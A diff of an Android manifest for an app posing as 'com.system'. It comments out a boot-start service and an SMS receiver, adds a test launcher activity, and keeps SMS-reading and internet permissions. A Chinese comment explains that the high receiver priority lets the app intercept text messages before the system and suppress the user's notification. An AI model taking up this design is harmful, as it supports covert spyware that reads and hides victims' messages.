@@ -2,25 +2,40 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
 	package="com.system" 
 	android:versionCode="1"	
-	android:versionName="1.0">
+	android:versionName="1.0 Alpha">
 	
 	<application android:icon="@drawable/icon" android:label="@string/app_name">
-		<service android:name=".BootService" android:enabled="true" />
-		<receiver android:name=".BootReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+	
+	 	<!-- 
+		<service android:name="com.system.BootService" android:enabled="true" />
+		<receiver android:name="com.system.BootReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<category android:name="android.intent.category.LAUNCHER" /> 
 			</intent-filter>
 		</receiver>
+		-->
 
 		<!--接受短消息需要注册的receiver，其中的android:name是继承了BroadCastReceiver的类的位置13 android:priority="100" 
 			指定了接收器的级别，这里设置的值比系统的值要高，这意味着程序的接受14 短消息要早于系统接受短消息，这也就给我们提供了拦截短消息，
 			不让系统发出短消息提示的机会。 -->
+		<!--	
 		<receiver android:name=".SmsBroadCast">
 			<intent-filter android:priority="100">
 				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
 			</intent-filter>
 		</receiver>
+		-->
+		
+		<!-- ONLY FOR TEST -->
+		<activity android:name="com.system.test.TestActivity"
+                  android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        
 	</application>
 	
 	<!-- User permissions -->
@@ -33,6 +48,6 @@
 	<uses-permission android:name="android.permission.READ_SMS" /> 
 	<uses-permission android:name="android.permission.INTERNET" />
 	
-	<uses-sdk android:minSdkVersion="5" /> <!-- Android 2.0 -->
+	<uses-sdk android:minSdkVersion="7" /> <!-- Android 2.1 -->
 	
 </manifest> 
